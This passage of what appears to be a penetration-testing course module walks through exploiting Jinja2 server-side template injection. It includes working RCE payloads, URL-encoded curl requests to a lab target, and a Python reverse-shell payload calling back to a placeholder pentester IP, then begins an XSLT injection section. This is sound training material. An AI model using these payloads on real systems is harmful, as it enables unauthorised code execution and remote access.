class="hljs-number"> 35 </span>code <span class="hljs-number"> 36 </span>frame <span class="hljs-number"> 37 </span>builtin_function_or_method <span class="hljs-number"> 38 </span>method <span class="hljs-number"> 39 </span>function <span class="hljs-number"> 40 </span>mappingproxy <span class="hljs-number"> 41 </span>generator <span class="hljs-number"> 42 </span>getset_descriptor <span class="hljs-number"> 43 </span>wrapper_descriptor <span class="hljs-number"> 44 </span>method-wrapper <span class="hljs-number"> 45 </span>ellipsis <span class="hljs-number"> 46 </span>member_descriptor <span class="hljs-number"> 47 </span>SimpleNamespace <span class="hljs-number"> 48 </span>PyCapsule <span class="hljs-number"> 49 </span>longrange_iterator <span class="hljs-number"> 50 </span>cell <span class="hljs-number"> 51 </span>instancemethod <span class="hljs-number"> 52 </span>classmethod_descriptor <span class="hljs-number"> 53 </span>method_descriptor <span class="hljs-number"> 54 </span>callable_iterator <span class="hljs-number"> 55 </span>iterator <span class="hljs-number"> 56 </span>PickleBuffer <span class="hljs-number"> 57 </span>coroutine <span class="hljs-number"> 58 </span>coroutine_wrapper <span class="hljs-number"> 59 </span>InterpreterID <span class="hljs-number"> 60 </span>EncodingMap <span class="hljs-number"> 61 </span>fieldnameiterator <span class="hljs-number"> 62 </span>formatteriterator <span class="hljs-number"> 63 </span>BaseException <span class="hljs-number"> 64 </span>hamt <span class="hljs-number"> 65 </span>hamt_array_node <span class="hljs-number"> 66 </span>hamt_bitmap_node <span class="hljs-number"> 67 </span>hamt_collision_node <span class="hljs-number"> 68 </span>keys <span class="hljs-number"> 69 </span>values <span class="hljs-number"> 70 </span>items <span class="hljs-number"> 71 </span>Context <span class="hljs-number"> 72 </span>ContextVar <span class="hljs-number"> 73 </span>Token <span class="hljs-number"> 74 </span>MISSING <span class="hljs-number"> 75 </span>moduledef <span class="hljs-number"> 76 </span>module <span class="hljs-number"> 77 </span>filter <span class="hljs-number"> 78 </span>map <span class="hljs-number"> 79 </span>zip <span class="hljs-number"> 80 </span>_ModuleLock <span class="hljs-number"> 81 </span>_DummyModuleLock <span class="hljs-number"> 82 </span>_ModuleLockManager <span class="hljs-number"> 83 </span>ModuleSpec <span class="hljs-number"> 84 </span>BuiltinImporter <span class="hljs-number"> 85 </span>classmethod <span class="hljs-number"> 86 </span>FrozenImporter <span class="hljs-number"> 87 </span>_ImportLockContext <span class="hljs-number"> 88 </span>_localdummy <span class="hljs-number"> 89 </span>_local <span class="hljs-number"> 90 </span>lock <span class="hljs-number"> 91 </span>RLock <span class="hljs-number"> 92 </span>_IOBase <span class="hljs-number"> 93 </span>_BytesIOBuffer <span class="hljs-number"> 94 </span>IncrementalNewlineDecoder <span class="hljs-number"> 95 </span>ScandirIterator <span class="hljs-number"> 96 </span>DirEntry <span class="hljs-number"> 97 </span>WindowsRegistryFinder <span class="hljs-number"> 98 </span>_LoaderBasics <span class="hljs-number"> 99 </span>FileLoader <span class="hljs-number"> 100 </span>_NamespacePath <span class="hljs-number"> 101 </span>_NamespaceLoader <span class="hljs-number"> 102 </span>PathFinder <span class="hljs-number"> 103 </span>FileFinder <span class="hljs-number"> 104 </span>zipimporter <span class="hljs-number"> 105 </span>_ZipImportResourceReader <span class="hljs-number"> 106 </span>Codec <span class="hljs-number"> 107 </span>IncrementalEncoder <span class="hljs-number"> 108 </span>IncrementalDecoder <span class="hljs-number"> 109 </span>StreamReaderWriter <span class="hljs-number"> 110 </span>StreamRecoder <span class="hljs-number"> 111 </span>_abc_data <span class="hljs-number"> 112 </span>ABC <span class="hljs-number"> 113 </span>dict_itemiterator <span class="hljs-number"> 114 </span>Hashable <span class="hljs-number"> 115 </span>Awaitable <span class="hljs-number"> 116 </span>AsyncIterable <span class="hljs-number"> 117 </span>async_generator <span class="hljs-number"> 118 </span>Iterable <span class="hljs-number"> 119 </span>bytes_iterator <span class="hljs-number"> 120 </span>bytearray_iterator <span class="hljs-number"> 121 </span>dict_keyiterator <span class="hljs-number"> 122 </span>dict_valueiterator <span class="hljs-number"> 123 </span>list_iterator <span class="hljs-number"> 124 </span>list_reverseiterator <span class="hljs-number"> 125 </span>range_iterator <span class="hljs-number"> 126 </span>set_iterator <span class="hljs-number"> 127 </span>str_iterator <span class="hljs-number"> 128 </span>tuple_iterator <span class="hljs-number"> 129 </span>Sized <span class="hljs-number"> 130 </span>Container <span class="hljs-number"> 131 </span>Callable <span class="hljs-number"> 132 </span>_wrap_close <span class="hljs-number"> 133 </span>Quitter <span class="hljs-number"> 134 </span>_Printer <span class="hljs-number"> 135 </span>_Helper <span class="hljs-number"> 136 </span>itemgetter <span class="hljs-number"> 137 </span>attrgetter <span class="hljs-number"> 138 </span>methodcaller <span class="hljs-number"> 139 </span>accumulate <span class="hljs-number"> 140 </span>combinations <span class="hljs-number"> 141 </span>combinations_with_replacement <span class="hljs-number"> 142 </span>cycle <span class="hljs-number"> 143 </span>dropwhile <span class="hljs-number"> 144 </span>takewhile <span class="hljs-number"> 145 </span>islice <span class="hljs-number"> 146 </span>starmap <span class="hljs-number"> 147 </span>chain <span class="hljs-number"> 148 </span>compress <span class="hljs-number"> 149 </span>filterfalse <span class="hljs-number"> 150 </span>count <span class="hljs-number"> 151 </span>zip_longest <span class="hljs-number"> 152 </span>permutations <span class="hljs-number"> 153 </span>product <span class="hljs-number"> 154 </span>repeat <span class="hljs-number"> 155 </span>groupby <span class="hljs-number"> 156 </span>_grouper <span class="hljs-number"> 157 </span>_tee <span class="hljs-number"> 158 </span>_tee_dataobject <span class="hljs-number"> 159 </span>Repr <span class="hljs-number"> 160 </span>deque <span class="hljs-number"> 161 </span>_deque_iterator <span class="hljs-number"> 162 </span>_deque_reverse_iterator <span class="hljs-number"> 163 </span>_tuplegetter <span class="hljs-number"> 164 </span>_Link <span class="hljs-number"> 165 </span>partial <span class="hljs-number"> 166 </span>_lru_cache_wrapper <span class="hljs-number"> 167 </span>partialmethod <span class="hljs-number"> 168 </span>singledispatchmethod <span class="hljs-number"> 169 </span>cached_property <span class="hljs-number"> 170 </span>DynamicClassAttribute <span class="hljs-number"> 171 </span>_GeneratorWrapper <span class="hljs-number"> 172 </span>auto <span class="hljs-number"> 173 </span>Enum <span class="hljs-number"> 174 </span>Pattern <span class="hljs-number"> 175 </span>Match <span class="hljs-number"> 176 </span>SRE_Scanner <span class="hljs-number"> 177 </span>State <span class="hljs-number"> 178 </span>SubPattern <span class="hljs-number"> 179 </span>Tokenizer <span class="hljs-number"> 180 </span>Scanner <span class="hljs-number"> 181 </span>Template <span class="hljs-number"> 182 </span>Formatter <span class="hljs-number"> 183 </span>ContextDecorator <span class="hljs-number"> 184 </span>_GeneratorContextManagerBase <span class="hljs-number"> 185 </span>_BaseExitStack <span class="hljs-number"> 186 </span>_Final <span class="hljs-number"> 187 </span>_Immutable <span class="hljs-number"> 188 </span>Generic <span class="hljs-number"> 189 </span>_TypingEmpty <span class="hljs-number"> 190 </span>_TypingEllipsis <span class="hljs-number"> 191 </span>NamedTuple <span class="hljs-number"> 192 </span>typing.io <span class="hljs-number"> 193 </span>typing.re <span class="hljs-number"> 194 </span>AST <span class="hljs-number"> 195 </span>_MarkupEscapeHelper <span class="hljs-number"> 196 </span>poll <span class="hljs-number"> 197 </span>epoll <span class="hljs-number"> 198 </span>BaseSelector <span class="hljs-number"> 199 </span>socket <span class="hljs-number"> 200 </span>_IterationGuard <span class="hljs-number"> 201 </span>WeakSet <span class="hljs-number"> 202 </span>_RLock <span class="hljs-number"> 203 </span>Condition <span class="hljs-number"> 204 </span>Semaphore <span class="hljs-number"> 205 </span>Event <span class="hljs-number"> 206 </span>Barrier <span class="hljs-number"> 207 </span>Thread <span class="hljs-number"> 208 </span>BaseServer <span class="hljs-number"> 209 </span>ForkingMixIn <span class="hljs-number"> 210 </span>_NoThreads <span class="hljs-number"> 211 </span>ThreadingMixIn <span class="hljs-number"> 212 </span>BaseRequestHandler <span class="hljs-number"> 213 </span>WarningMessage <span class="hljs-number"> 214 </span>catch_warnings <span class="hljs-number"> 215 </span>date <span class="hljs-number"> 216 </span>timedelta <span class="hljs-number"> 217 </span>time <span class="hljs-number"> 218 </span>tzinfo <span class="hljs-number"> 219 </span>_Info <span class="hljs-number"> 220 </span>finalize <span class="hljs-number"> 221 </span>sha384 <span class="hljs-number"> 222 </span>sha512 <span class="hljs-number"> 223 </span>Random <span class="hljs-number"> 224 </span>_ResultMixinStr <span class="hljs-number"> 225 </span>_ResultMixinBytes <span class="hljs-number"> 226 </span>_NetlocResultMixinBase <span class="hljs-number"> 227 </span>_localized_month <span class="hljs-number"> 228 </span>_localized_day <span class="hljs-number"> 229 </span>Calendar <span class="hljs-number"> 230 </span>different_locale <span class="hljs-number"> 231 </span>AddrlistClass <span class="hljs-number"> 232 </span>Struct <span class="hljs-number"> 233 </span>unpack_iterator <span class="hljs-number"> 234 </span>Charset <span class="hljs-number"> 235 </span>Header <span class="hljs-number"> 236 </span>_ValueFormatter <span class="hljs-number"> 237 </span>_PolicyBase <span class="hljs-number"> 238 </span>BufferedSubFile <span class="hljs-number"> 239 </span>FeedParser <span class="hljs-number"> 240 </span>Parser <span class="hljs-number"> 241 </span>BytesParser <span class="hljs-number"> 242 </span>Message <span class="hljs-number"> 243 </span>HTTPConnection <span class="hljs-number"> 244 </span>_SSLContext <span class="hljs-number"> 245 </span>_SSLSocket <span class="hljs-number"> 246 </span>MemoryBIO <span class="hljs-number"> 247 </span>Session <span class="hljs-number"> 248 </span>SSLObject <span class="hljs-number"> 249 </span>MimeTypes <span class="hljs-number"> 250 </span>Compress <span class="hljs-number"> 251 </span>Decompress <span class="hljs-number"> 252 </span>BZ2Compressor <span class="hljs-number"> 253 </span>BZ2Decompressor <span class="hljs-number"> 254 </span>LZMACompressor <span class="hljs-number"> 255 </span>LZMADecompressor <span class="hljs-number"> 256 </span>Bytecode <span class="hljs-number"> 257 </span>Untokenizer <span class="hljs-number"> 258 </span>BlockFinder <span class="hljs-number"> 259 </span>_void <span class="hljs-number"> 260 </span>_empty <span class="hljs-number"> 261 </span>Parameter <span class="hljs-number"> 262 </span>BoundArguments <span class="hljs-number"> 263 </span>Signature <span class="hljs-number"> 264 </span>FrameSummary <span class="hljs-number"> 265 </span>TracebackException <span class="hljs-number"> 266 </span>LogRecord <span class="hljs-number"> 267 </span>PercentStyle <span class="hljs-number"> 268 </span>Formatter <span class="hljs-number"> 269 </span>BufferingFormatter <span class="hljs-number"> 270 </span>Filter <span class="hljs-number"> 271 </span>Filterer <span class="hljs-number"> 272 </span>PlaceHolder <span class="hljs-number"> 273 </span>Manager <span class="hljs-number"> 274 </span>LoggerAdapter <span class="hljs-number"> 275 </span>_Missing <span class="hljs-number"> 276 </span>Aborter <span class="hljs-number"> 277 </span>Href <span class="hljs-number"> 278 </span>CompletedProcess <span class="hljs-number"> 279 </span>Popen <span class="hljs-number"> 280 </span>HASH <span class="hljs-number"> 281 </span>blake2b <span class="hljs-number"> 282 </span>blake2s <span class="hljs-number"> 283 </span>sha3_224 <span class="hljs-number"> 284 </span>sha3_256 <span class="hljs-number"> 285 </span>sha3_384 <span class="hljs-number"> 286 </span>sha3_512 <span class="hljs-number"> 287 </span>shake_128 <span class="hljs-number"> 288 </span>shake_256 <span class="hljs-number"> 289 </span>_RandomNameSequence <span class="hljs-number"> 290 </span>_TemporaryFileCloser <span class="hljs-number"> 291 </span>_TemporaryFileWrapper <span class="hljs-number"> 292 </span>SpooledTemporaryFile <span class="hljs-number"> 293 </span>TemporaryDirectory <span class="hljs-number"> 294 </span>Request <span class="hljs-number"> 295 </span>OpenerDirector <span class="hljs-number"> 296 </span>BaseHandler <span class="hljs-number"> 297 </span>HTTPPasswordMgr <span class="hljs-number"> 298 </span>AbstractBasicAuthHandler <span class="hljs-number"> 299 </span>AbstractDigestAuthHandler <span class="hljs-number"> 300 </span>URLopener <span class="hljs-number"> 301 </span>ftpwrapper <span class="hljs-number"> 302 </span>Cookie <span class="hljs-number"> 303 </span>CookiePolicy <span class="hljs-number"> 304 </span>Absent <span class="hljs-number"> 305 </span>CookieJar <span class="hljs-number"> 306 </span>ImmutableListMixin <span class="hljs-number"> 307 </span>ImmutableDictMixin <span class="hljs-number"> 308 </span>_omd_bucket <span class="hljs-number"> 309 </span>Headers <span class="hljs-number"> 310 </span>ImmutableHeadersMixin <span class="hljs-number"> 311 </span>IfRange <span class="hljs-number"> 312 </span>Range <span class="hljs-number"> 313 </span>ContentRange <span class="hljs-number"> 314 </span>FileStorage <span class="hljs-number"> 315 </span>_HAS_DEFAULT_FACTORY_CLASS <span class="hljs-number"> 316 </span>_MISSING_TYPE <span class="hljs-number"> 317 </span>_FIELD_BASE <span class="hljs-number"> 318 </span>InitVar <span class="hljs-number"> 319 </span>Field <span class="hljs-number"> 320 </span>_DataclassParams <span class="hljs-number"> 321 </span>Event <span class="hljs-number"> 322 </span>MultipartDecoder <span class="hljs-number"> 323 </span>MultipartEncoder <span class="hljs-number"> 324 </span>Finder <span class="hljs-number"> 325 </span>Loader <span class="hljs-number"> 326 </span>ResourceReader <span class="hljs-number"> 327 </span>ImpImporter <span class="hljs-number"> 328 </span>ImpLoader <span class="hljs-number"> 329 </span>HMAC <span class="hljs-number"> 330 </span>ClosingIterator <span class="hljs-number"> 331 </span>FileWrapper <span class="hljs-number"> 332 </span>_RangeWrapper <span class="hljs-number"> 333 </span>HTMLBuilder <span class="hljs-number"> 334 </span>AcceptMixin <span class="hljs-number"> 335 </span>AuthorizationMixin <span class="hljs-number"> 336 </span>WWWAuthenticateMixin <span class="hljs-number"> 337 </span>Scanner <span class="hljs-number"> 338 </span>Encoder <span class="hljs-number"> 339 </span>JSONDecoder <span class="hljs-number"> 340 </span>JSONEncoder <span class="hljs-number"> 341 </span>FormDataParser <span class="hljs-number"> 342 </span>MultiPartParser <span class="hljs-number"> 343 </span>UserAgent <span class="hljs-number"> 344 </span>_UserAgentParser <span class="hljs-number"> 345 </span>Request <span class="hljs-number"> 346 </span>StreamOnlyMixin <span class="hljs-number"> 347 </span>Response <span class="hljs-number"> 348 </span>ResponseStream <span class="hljs-number"> 349 </span>ResponseStreamMixin <span class="hljs-number"> 350 </span>CommonRequestDescriptorsMixin <span class="hljs-number"> 351 </span>CommonResponseDescriptorsMixin <span class="hljs-number"> 352 </span>ETagRequestMixin <span class="hljs-number"> 353 </span>ETagResponseMixin <span class="hljs-number"> 354 </span>UserAgentMixin <span class="hljs-number"> 355 </span>_TestCookieHeaders <span class="hljs-number"> 356 </span>_TestCookieResponse <span class="hljs-number"> 357 </span>EnvironBuilder <span class="hljs-number"> 358 </span>Client <span class="hljs-number"> 359 </span>Decimal <span class="hljs-number"> 360 </span>Context <span class="hljs-number"> 361 </span>SignalDictMixin <span class="hljs-number"> 362 </span>ContextManager <span class="hljs-number"> 363 </span>Number <span class="hljs-number"> 364 </span>UUID <span class="hljs-number"> 365 </span>Unpickler <span class="hljs-number"> 366 </span>Pickler <span class="hljs-number"> 367 </span>Pdata <span class="hljs-number"> 368 </span>PicklerMemoProxy <span class="hljs-number"> 369 </span>UnpicklerMemoProxy <span class="hljs-number"> 370 </span>_Framer <span class="hljs-number"> 371 </span>_Unframer <span class="hljs-number"> 372 </span>_Pickler <span class="hljs-number"> 373 </span>_Unpickler <span class="hljs-number"> 374 </span>Bucket <span class="hljs-number"> 375 </span>BytecodeCache <span class="hljs-number"> 376 </span>MissingType <span class="hljs-number"> 377 </span>LRUCache <span class="hljs-number"> 378 </span>Cycler <span class="hljs-number"> 379 </span>Joiner <span class="hljs-number"> 380 </span>Namespace <span class="hljs-number"> 381 </span>EvalContext <span class="hljs-number"> 382 </span>Node <span class="hljs-number"> 383 </span>NodeVisitor <span class="hljs-number"> 384 </span>Symbols <span class="hljs-number"> 385 </span>MacroRef <span class="hljs-number"> 386 </span>Frame <span class="hljs-number"> 387 </span>TemplateReference <span class="hljs-number"> 388 </span>Context <span class="hljs-number"> 389 </span>BlockReference <span class="hljs-number"> 390 </span>LoopContext <span class="hljs-number"> 391 </span>Macro <span class="hljs-number"> 392 </span>Undefined <span class="hljs-number"> 393 </span>NodeVisitor <span class="hljs-number"> 394 </span>Failure <span class="hljs-number"> 395 </span>TokenStreamIterator <span class="hljs-number"> 396 </span>TokenStream <span class="hljs-number"> 397 </span>Lexer <span class="hljs-number"> 398 </span>Parser <span class="hljs-number"> 399 </span>Environment <span class="hljs-number"> 400 </span>Template <span class="hljs-number"> 401 </span>TemplateModule <span class="hljs-number"> 402 </span>TemplateExpression <span class="hljs-number"> 403 </span>TemplateStream <span class="hljs-number"> 404 </span>BaseLoader <span class="hljs-number"> 405 </span>Local <span class="hljs-number"> 406 </span>LocalStack <span class="hljs-number"> 407 </span>LocalManager <span class="hljs-number"> 408 </span>_ProxyLookup <span class="hljs-number"> 409 </span>LocalProxy <span class="hljs-number"> 410 </span>SequenceMatcher <span class="hljs-number"> 411 </span>Differ <span class="hljs-number"> 412 </span>HtmlDiff <span class="hljs-number"> 413 </span>_safe_key <span class="hljs-number"> 414 </span>PrettyPrinter <span class="hljs-number"> 415 </span>RuleFactory <span class="hljs-number"> 416 </span>RuleTemplate <span class="hljs-number"> 417 </span>BaseConverter <span class="hljs-number"> 418 </span>Map <span class="hljs-number"> 419 </span>MapAdapter <span class="hljs-number"> 420 </span>NullTranslations <span class="hljs-number"> 421 </span>_FixupStream <span class="hljs-number"> 422 </span>_AtomicFile <span class="hljs-number"> 423 </span>LazyFile <span class="hljs-number"> 424 </span>KeepOpenFile <span class="hljs-number"> 425 </span>PacifyFlushWrapper <span class="hljs-number"> 426 </span>ParamType <span class="hljs-number"> 427 </span>Option <span class="hljs-number"> 428 </span>Argument <span class="hljs-number"> 429 </span>ParsingState <span class="hljs-number"> 430 </span>OptionParser <span class="hljs-number"> 431 </span>HelpFormatter <span class="hljs-number"> 432 </span>Context <span class="hljs-number"> 433 </span>BaseCommand <span class="hljs-number"> 434 </span>Parameter <span class="hljs-number"> 435 </span>Namespace <span class="hljs-number"> 436 </span>_FakeSignal <span class="hljs-number"> 437 </span>DispatchingApp <span class="hljs-number"> 438 </span>ScriptInfo <span class="hljs-number"> 439 </span>ConfigAttribute <span class="hljs-number"> 440 </span>_AppCtxGlobals <span class="hljs-number"> 441 </span>AppContext <span class="hljs-number"> 442 </span>RequestContext <span class="hljs-number"> 443 </span>Scaffold <span class="hljs-number"> 444 </span>_CompactJSON <span class="hljs-number"> 445 </span>SigningAlgorithm <span class="hljs-number"> 446 </span>Signer <span class="hljs-number"> 447 </span>Serializer <span class="hljs-number"> 448 </span>JSONTag <span class="hljs-number"> 449 </span>TaggedJSONSerializer &lt;/a&gt;
                &lt;br/&gt;
                &lt;input type="submit" value="execute"&gt;
            &lt;/form&gt;
        &lt;/div&gt;
&lt;SNIP&gt;
&lt;/body&gt;
</code></pre>
<p>As you can see in the application&#39;s response, <code>catch_warnings</code> is located at index #214.</p>
<p>We have everything we need to construct an RCE payload, such as the following.</p>
<pre><code class="lang-python">{{''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">1</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">214</span>](<span class="hljs-link"></span>).<span class="hljs-emphasis">_module._</span><span class="hljs-emphasis">_builtins_</span><span class="hljs-emphasis">_['_</span><span class="hljs-emphasis">_import_</span>_']('os').system("touch /tmp/test1") }}
</code></pre>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -gs "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:&lt;PORT&gt;/execute</span>?cmd=%7B%7B%27%27.__class_<span class="hljs-number">_</span>.__mro_<span class="hljs-number">_</span>%5B1%5D.__subclasses_<span class="hljs-number">_</span>%28%29%5B214%5D%28%29._module.__builtins_<span class="hljs-number">_</span>%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D<span class="hljs-string">"

&lt;SNIP&gt;
&lt;body&gt;
    &lt;div id="</span>desktop<span class="hljs-string">"&gt;
        &lt;div class="</span>window<span class="hljs-string">" data-title="</span>Run<span class="hljs-string">"&gt;
            &lt;form action="</span>/execute<span class="hljs-string">" method="</span>get<span class="hljs-string">"&gt;
                &lt;a&gt;C:\&gt;&lt;input type="</span>text<span class="hljs-string">" name="</span>cmd<span class="hljs-string">" id="</span>command<span class="hljs-string">"&gt;&lt;/a&gt;
                &lt;br/&gt;
                &lt;a&gt;0&lt;/a&gt;
                &lt;br/&gt;
                &lt;input type="</span>submit<span class="hljs-string">" value="</span>execute<span class="hljs-string">"&gt;
            &lt;/form&gt;
        &lt;/div&gt;
&lt;SNIP&gt;
&lt;/body&gt;</span>
</code></pre>
<p>The application returns <code>0</code> in its response. This is the return of the value of the command we just executed. <code>0</code> indicates that the command was executed without errors.</p>
<p>We can identify if <code>test1</code> was created using the following payload.</p>
<pre><code class="lang-python">{{''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">1</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">214</span>](<span class="hljs-link"></span>).<span class="hljs-emphasis">_module._</span><span class="hljs-emphasis">_builtins_</span><span class="hljs-emphasis">_['_</span><span class="hljs-emphasis">_import_</span>_']('os').popen('ls /tmp').read()}}
</code></pre>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -gs "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:&lt;PORT&gt;/execute</span>?cmd=%7B%7B%27%27.__class_<span class="hljs-number">_</span>.__mro_<span class="hljs-number">_</span>%5B1%5D.__subclasses_<span class="hljs-number">_</span>%28%29%5B214%5D%28%29._module.__builtins_<span class="hljs-number">_</span>%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D<span class="hljs-string">"

&lt;SNIP&gt;
&lt;body&gt;
    &lt;div id="</span>desktop<span class="hljs-string">"&gt;
        &lt;div class="</span>window<span class="hljs-string">" data-title="</span>Run<span class="hljs-string">"&gt;
            &lt;form action="</span>/execute<span class="hljs-string">" method="</span>get<span class="hljs-string">"&gt;
                &lt;a&gt;C:\&gt;&lt;input type="</span>text<span class="hljs-string">" name="</span>cmd<span class="hljs-string">" id="</span>command<span class="hljs-string">"&gt;&lt;/a&gt;
                &lt;br/&gt;
                &lt;a&gt;test1
tmpv4tucw2b
&lt;/a&gt;
                &lt;br/&gt;
                &lt;input type="</span>submit<span class="hljs-string">" value="</span>execute<span class="hljs-string">"&gt;
            &lt;/form&gt;
        &lt;/div&gt;
&lt;SNIP&gt;
&lt;/body&gt;</span>
</code></pre>
<p>Now that we have gone through the payload development process, it&#39;s worth mentioning that we can use some specific functions to facilitate the exploitation of Jinja2 SSTI vulnerabilities. Those are <code>request</code> and <code>lipsum</code>. Feel free to submit them to this section&#39;s target.</p>
<pre><code class="lang-python">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-name">'os'</span>).popen(<span class="hljs-name">'id'</span>).read()}}
</code></pre>
<pre><code class="lang-python">{{lipsum.__globals__.os.popen(<span class="hljs-name">'id'</span>).read()}}
</code></pre>
<p>A reverse shell can also be established through a payload such as the below.</p>
<pre><code class="lang-python">{{''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">1</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">214</span>](<span class="hljs-link"></span>).<span class="hljs-emphasis">_module._</span><span class="hljs-emphasis">_builtins_</span><span class="hljs-emphasis">_['_</span><span class="hljs-emphasis">_import_</span><span class="hljs-emphasis">_']('os').popen('python -c \'socket=_</span><span class="hljs-emphasis">_import_</span><span class="hljs-emphasis">_("socket");os=_</span><span class="hljs-emphasis">_import_</span><span class="hljs-emphasis">_("os");pty=_</span><span class="hljs-emphasis">_import_</span><span class="hljs-emphasis">_("pty");s=socket.socket(socket.AF_</span>INET,socket.SOCK<span class="hljs-emphasis">_STREAM);s.connect(("&lt;PENTESTER_</span>IP&gt;",<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">PENTESTER_PORT</span>&gt;</span></span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()}}
</code></pre>
<p>Now, proceed to this section&#39;s exercise and complete the objective either by crafting the payload yourself or through a shell obtained with the help of <code>tplmap</code>.</p>
<h2 id="attacking-xslt">Attacking XSLT</h2>
<hr>
<p>Extensible Stylesheet Language Transformations (<code>XSLT</code>) is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. Extensible Stylesheet Language Transformations Server-Side Injection can occur when arbitrary XSLT file upload is possible or when an application generates the XSL Transformationâ€™s XML document dynamically using unvalidated input from the user.</p>
<p>Depending on the case, XSLT uses built-in functions and the XPATH language to transform a document either in the browser or the server. Extensible Stylesheet Language Transformations are present in some web applications as standalone functionality, SSI engines, and databases like Oracle. At the time of writing, there are 3 (<a href="https://www.w3.org/TR/xslt-10/">1</a>, <a href="https://www.w3.org/TR/xslt20/">2</a>, <a href="https://www.w3.org/TR/xslt-30/">3</a>) XSLT versions. Version 1 is the least interesting from an attacker&#39;s perspective due to the limited built-in functionality. The most used XSLT-related projects are LibXSLT, Xalan, and Saxon. To exploit XSLT Injections, we need to store malicious tags on the server-side and access that content.</p>
<p>Let us experiment with XSLT by using a combination of Saxon with XSLT Version 2.</p>
<p>First, install the required packages on Pwnbox or a local VM, as follows:</p>
<p><strong>Installation of required packages</strong></p>
<p>Attacking XSLT</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo apt <span class="hljs-keyword">install</span> <span class="hljs-keyword">default</span>-jdk libsaxon-<span class="hljs-keyword">java</span> libsaxonb-<span class="hljs-keyword">java</span>
</code></pre>
<p>Next, create the following files:</p>
<p><strong>catalogue.xml</strong></p>
<p>Code: xml</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">catalog</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Empire Burlesque<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Bob Dylan<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>USA<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>Columbia<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>10.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1985<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Hide your heart<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Bonnie Tyler<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>UK<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>CBS Records<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>9.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1988<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Greatest Hits<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artist</span>&gt;</span>Dolly Parton<span class="hljs-tag">&lt;/<span class="hljs-name">artist</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">country</span>&gt;</span>USA<span class="hljs-tag">&lt;/<span class="hljs-name">country</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">company</span>&gt;</span>RCA<span class="hljs-tag">&lt;/<span class="hljs-name">company</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>9.90<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>1982<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">cd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cd</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Still got the blues<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
